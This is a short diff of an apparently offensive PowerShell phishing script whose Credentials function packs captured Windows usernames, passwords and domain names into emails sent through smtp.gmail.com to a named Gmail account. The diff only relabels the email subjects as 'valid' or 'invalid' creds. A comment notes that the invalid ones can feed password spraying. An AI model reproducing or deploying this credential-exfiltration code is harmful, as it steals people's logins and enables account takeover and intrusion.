@@ -163,7 +163,7 @@ function Credentials() {
 
             	# SEND SECOND EMAIL IF USER ENTER VALID SYSTEM CREDENTIALS
 		$local_creds= "Username: " + $Username+ " Password: " + $Password+ " Domain:" + $CurrentDomain_Name
-	    	$System_Subject = "SYSTEM CREDENTIALS HIJACKED!!!!"
+	    	$System_Subject = "SYSTEM CREDENTIALS HIJACKED (VALID CREDS) !!!!"
 		$newline = "`r`n"
 		$SmtpServer = 'smtp.gmail.com'
 		$SmtpUser = 'firmusphising@gmail.com'
@@ -180,7 +180,7 @@ function Credentials() {
                 else {
 		    # SEND EMAIL IF USER ENTER INVALID SYSTEM CREDENTIALS, CAN BE USED FOR PASSWORD SPRAYING
 		    $local_creds= "Username: " + $Username+ " Password: " + $Password+ " Domain:" + $CurrentDomain_Name
-	    	    $System_Subject = "SYSTEM CREDENTIALS HIJACKED!!!!"
+	    	    $System_Subject = "SYSTEM CREDENTIALS HIJACKED (INVALID CREDS) !!!!"
 		    $newline = "`r`n"
 	            $SmtpServer = 'smtp.gmail.com'
 		    $SmtpUser = 'firmusphising@gmail.com'
